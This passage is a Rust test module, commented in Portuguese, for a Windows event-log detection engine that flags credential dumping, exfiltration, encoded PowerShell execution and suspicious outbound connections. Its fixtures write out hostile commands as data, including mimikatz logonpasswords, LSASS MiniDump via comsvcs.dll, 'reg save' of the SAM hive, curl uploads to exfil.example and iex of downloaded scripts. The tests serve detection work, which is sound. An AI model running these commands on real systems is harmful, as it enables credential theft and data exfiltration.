                "Microsoft-Windows-PowerShell",
                "WS01",
                json!({"ScriptBlockText": text, "UserId": "bob"}),
            )
        };
        feed.push(
            &ts(9, 10),
            block(
                "$b = [Convert]::FromBase64String($x); iex ([Text.Encoding]::UTF8.GetString($b))",
            ),
        );
        feed.push(&ts(9, 11), block("Get-ChildItem -e foo"));
        let candidates = feed.finish();
        let hits = by_rule(&candidates, "R-EXEC-001");
        assert_eq!(hits.len(), 1);
        assert_eq!(hits[0].count, 1);
    }

    #[test]
    fn powershell_minidumpwritedump_of_lsass_is_a_credential_candidate() {
        let mut feed = Feed::new();
        feed.push(
            &ts(9, 15),
            record(
                4104,
                "Microsoft-Windows-PowerShell",
                "WS01",
                json!({"ScriptBlockText": "$h = Get-Process lsass; MiniDumpWriteDump $h", "UserId": "bob"}),
            ),
        );
        feed.push(
            &ts(9, 16),
            record(
                4104,
                "Microsoft-Windows-PowerShell",
                "WS01",
                json!({"ScriptBlockText": "MiniDumpWriteDump $process", "UserId": "bob"}),
            ),
        );
        let candidates = feed.finish();
        let hits = by_rule(&candidates, "R-CRED-001");
        assert_eq!(hits.len(), 1);
        assert_eq!(hits[0].count, 1, "LSASS é obrigatório: {hits:?}");
        assert_eq!(hits[0].severity, "HIGH");
    }

    #[test]
    fn credential_dumping_strings_are_flagged_as_high() {
        let mut feed = Feed::new();
        feed.push(
            &ts(9, 20),
            process("mimikatz.exe privilege::debug sekurlsa::logonpasswords"),
        );
        feed.push(&ts(9, 21), process("rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\temp\\l.dmp full"));
        feed.push(&ts(9, 22), process("reg save HKLM\\SAM C:\\temp\\sam.save"));
        feed.push(&ts(9, 23), process("reg query HKLM\\Software\\Microsoft")); // não é dump
        feed.push(
            &ts(9, 24),
            process("notepad.exe notas-sobre-mimikatz-no-nome.txt"),
        ); // contém o termo: aceito como falso positivo documentado
        let candidates = feed.finish();
        let hits = by_rule(&candidates, "R-CRED-001");
        assert_eq!(hits.len(), 1);
        assert_eq!(hits[0].count, 4);
        assert_eq!(hits[0].severity, "HIGH");
        assert!(hits[0].limitations.contains("texto"));
    }

    #[test]
    fn upload_tools_are_exfiltration_candidates_and_archiving_is_only_collection() {
        let mut feed = Feed::new();
        feed.push(
            &ts(10, 0),
            process("rclone.exe copy C:\\dados remote:bucket --config rc.conf"),
        );
        feed.push(
            &ts(10, 1),
            process("curl.exe -T C:\\dados\\x.zip https://exfil.example/up"),
        );
        feed.push(
            &ts(10, 2),
            process("curl.exe https://exemplo.com/arquivo.zip -o a.zip"),
        ); // download
        feed.push(
            &ts(10, 3),
            process(
                "powershell Invoke-WebRequest -Uri https://x.example/u -Method Post -InFile a.zip",
            ),
        );
        feed.push(&ts(10, 4), process("7z a C:\\temp\\dados.7z C:\\dados\\*"));
        feed.push(&ts(10, 5), process("notepad.exe"));
        let candidates = feed.finish();
        let exfil = by_rule(&candidates, "R-EXFIL-001");
        assert_eq!(exfil.len(), 1, "{exfil:?}");
        assert_eq!(
            exfil[0].count, 3,
            "rclone, curl -T e Invoke-WebRequest -Method Post"
        );
        assert_eq!(exfil[0].tactic, "EXFILTRATION");
        assert!(
            exfil[0]
                .iocs
                .iter()
                .any(|ioc| ioc.value.starts_with("https://exfil.example"))
        );
        let collection = by_rule(&candidates, "R-COLL-001");
        assert_eq!(collection.len(), 1);
        assert_eq!(collection[0].severity, "LOW");
    }

    #[test]
    fn a_word_that_merely_contains_a_tool_name_is_not_an_upload_tool() {
        let mut feed = Feed::new();
        feed.push(
            &ts(10, 10),
            process("notepad.exe C:\\docs\\rclone-notes.txt"),
        );
        feed.push(&ts(10, 11), process("curl.exe https://exemplo.com/x")); // sem opção de envio
        assert!(by_rule(&feed.finish(), "R-EXFIL-001").is_empty());
    }

    // --- rede de saída ---

    #[test]
    fn outbound_connections_from_command_line_tools_to_public_ips_fire() {
        let mut feed = Feed::new();
        let wfp = |app: &str, dst: &str, direction: &str| {
            security(
                5156,
                json!({"Application": app, "SourceAddress": "10.0.0.5", "DestAddress": dst, "Direction": direction}),
            )
        };
        feed.push(&ts(11, 0), wfp("\\device\\harddiskvolume2\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe", "185.220.101.5", "%%14593"));
        feed.push(&ts(11, 1), wfp("\\device\\harddiskvolume2\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe", "10.0.0.20", "%%14593")); // destino interno
        feed.push(
            &ts(11, 2),
            wfp(
                "\\device\\harddiskvolume2\\program files\\chrome\\chrome.exe",
                "185.220.101.5",
                "%%14593",
            ),
        ); // navegador
        feed.push(&ts(11, 3), wfp("\\device\\harddiskvolume2\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe", "185.220.101.6", "%%14592")); // entrada
        let candidates = feed.finish();
        let hits = by_rule(&candidates, "R-EXFIL-002");
        assert_eq!(hits.len(), 1, "{hits:?}");
        assert_eq!(hits[0].count, 1);
        assert!(hits[0].iocs.iter().any(|ioc| ioc.value == "185.220.101.5"));
        assert!(hits[0].limitations.contains("5156"));
    }

    #[test]
    fn sysmon_network_connections_are_read_with_the_initiated_flag() {
        let mut feed = Feed::new();
        let sysmon = |initiated: &str| {
            record(
                3,
                "Microsoft-Windows-Sysmon",
                "WS01",
                json!({"Image": "C:\\Windows\\System32\\curl.exe", "User": "bob", "SourceIp": "10.0.0.5", "DestinationIp": "8.8.8.8", "Initiated": initiated}),
            )
        };
        feed.push(&ts(11, 10), sysmon("true"));
        feed.push(&ts(11, 11), sysmon("false"));
        let hits_total: u64 = by_rule(&feed.finish(), "R-EXFIL-002")
            .iter()
            .map(|c| c.count)
            .sum();
        assert_eq!(hits_total, 1);
    }

    // --- comportamento do motor ---

    #[test]
    fn candidates_carry_a_stable_key_and_the_rule_set_version() {
        let run = || {
            let mut feed = Feed::new();
            feed.push(
                &ts(0, 0),
                security(4720, json!({"TargetUserName": "x", "SubjectUserName": "y"})),
            );
            feed.finish()
        };
        let (a, b) = (run(), run());
        assert_eq!(
            a[0].candidate_key, b[0].candidate_key,
            "mesma entrada, mesma chave"
        );
        assert_eq!(a[0].candidate_key.len(), 32);
        assert_eq!(a[0].rule_set_version, RULE_SET_VERSION);
        assert_eq!(a[0].evidence_id, "evidence/test.evtx");
        let mut other = Feed::new();
        other.push(
            &ts(0, 0),
            security(4720, json!({"TargetUserName": "z", "SubjectUserName": "y"})),
        );
        assert_ne!(other.finish()[0].candidate_key, a[0].candidate_key);
    }

    #[test]
    fn event_references_are_bounded_and_flag_truncation() {
        let mut feed = Feed::new();
        for index in 0..500 {
            feed.push(
                &ts(0, index % 60),
                security(
                    4672,
                    json!({"SubjectUserName": "fsir", "PrivilegeList": "SeDebugPrivilege"}),
                ),
            );
        }
        let candidates = feed.finish();
        let hit = &by_rule(&candidates, "R-PRIV-001")[0];
        assert_eq!(hit.count, 500);
        assert_eq!(hit.event_refs.len(), MAX_CANDIDATE_EVENT_REFS);
        assert!(hit.refs_truncated);
        assert_eq!(hit.event_refs.first().map(String::as_str), Some("record:1"));
        assert_eq!(
            hit.event_refs.last().map(String::as_str),
            Some("record:500")
        );
    }

    #[test]
    fn the_number_of_candidates_is_capped_and_the_overflow_is_counted() {
        let mut feed = Feed::new();
        for index in 0..(MAX_CANDIDATES + 25) {
            feed.push(
                &ts(0, 0),
                security(
                    4720,
                    json!({"TargetUserName": format!("u{index}"), "SubjectUserName": "y"}),
                ),
            );
        }
        let (candidates, stats) = feed.detector.finish();
        assert_eq!(candidates.len(), MAX_CANDIDATES);
        assert_eq!(stats.dropped_candidates, 25);
        assert_eq!(stats.events_seen, (MAX_CANDIDATES + 25) as u64);
    }

    #[test]
    fn unrelated_events_and_hostile_values_produce_nothing_and_do_not_panic() {
        let mut feed = Feed::new();
        feed.push(&ts(0, 0), security(4634, json!({"TargetUserName": "x"})));
        feed.push(&ts(0, 1), security(4624, json!({"LogonType": "não-número", "IpAddress": "\u{202E}999.1.1.1", "TargetUserName": "a".repeat(100_000)})));
        feed.push(
            "data inválida",
            security(
                4625,
                json!({"TargetUserName": "x", "IpAddress": "185.220.101.5"}),
            ),
        );
        feed.push(&ts(0, 2), json!({"Event": {}}));
        assert!(feed.finish().is_empty());
    }

    #[test]
    fn the_catalogue_is_consistent_unique_and_uses_known_attack_tactics() {
        const TACTICS: [&str; 14] = [
            "RECONNAISSANCE",
            "RESOURCE_DEVELOPMENT",
            "INITIAL_ACCESS",
            "EXECUTION",
            "PERSISTENCE",
            "PRIVILEGE_ESCALATION",
            "DEFENSE_EVASION",
            "CREDENTIAL_ACCESS",
            "DISCOVERY",
            "LATERAL_MOVEMENT",
            "COLLECTION",
            "COMMAND_AND_CONTROL",
            "EXFILTRATION",
            "IMPACT",
        ];
        let rules = catalogue();
        let ids: BTreeSet<&str> = rules.iter().map(|rule| rule.id).collect();
        assert_eq!(ids.len(), rules.len(), "ids únicos");
        for rule in rules {
            assert!(
                TACTICS.contains(&rule.tactic),
                "{} tem tática desconhecida {}",
                rule.id,
                rule.tactic
            );
            assert!(
                rule.technique.starts_with('T') && rule.technique.len() == 5,
                "{}",
                rule.id
            );
            if let Some(sub) = rule.sub_technique {
                assert!(
                    sub.starts_with(rule.technique),
                    "{}: {sub} fora de {}",
                    rule.id,
                    rule.technique
                );
            }
            assert!(
                ["LOW", "MEDIUM", "HIGH", "CRITICAL"].contains(&rule.severity),
                "{}",
                rule.id
            );
            // Regra automática nunca afirma mais que confiança média.
            assert!(["LOW", "MEDIUM"].contains(&rule.confidence), "{}", rule.id);
            assert!(
                !rule.limitations.is_empty(),
                "{} precisa declarar o que não prova",
                rule.id
            );
            assert!(!rule.title.is_empty() && !rule.description.is_empty());
        }
        // Os quatro pedidos da demanda têm regra.
        for tactic in [
            "INITIAL_ACCESS",
            "LATERAL_MOVEMENT",
            "PRIVILEGE_ESCALATION",
            "EXFILTRATION",
        ] {
            assert!(
                rules.iter().any(|rule| rule.tactic == tactic),
                "sem regra para {tactic}"
            );
        }
    }

    #[test]
    fn the_documentation_lists_every_rule_with_its_version_and_the_rule_set_version() {
        let doc = include_str!("../../docs/DETECTION_RULES.md");
        assert!(
            doc.contains(RULE_SET_VERSION),
            "docs/DETECTION_RULES.md não cita o conjunto {RULE_SET_VERSION}: regenere a tabela"
        );
        for rule in catalogue() {
            assert!(
                doc.contains(&format!("`{}` v{}", rule.id, rule.version)),
                "docs/DETECTION_RULES.md não lista {} v{}",
                rule.id,
                rule.version
            );
            assert!(
                doc.contains(rule.limitations),
                "o limite de {} mudou: regenere docs/DETECTION_RULES.md",
                rule.id
            );
        }
    }

    #[test]
    fn url_extraction_stops_at_delimiters_and_is_bounded() {
        let urls = extract_urls(
            "iex (iwr 'http://a.example/x.ps1') ; curl https://b.example/y, http://c.example",
            5,
        );
        assert_eq!(
            urls,
            vec![
                "http://a.example/x.ps1",
                "https://b.example/y",
                "http://c.example"
            ]
        );
        assert_eq!(extract_urls(&"http://x.example/ ".repeat(50), 3).len(), 3);
        assert!(extract_urls("sem url", 3).is_empty());
    }
}
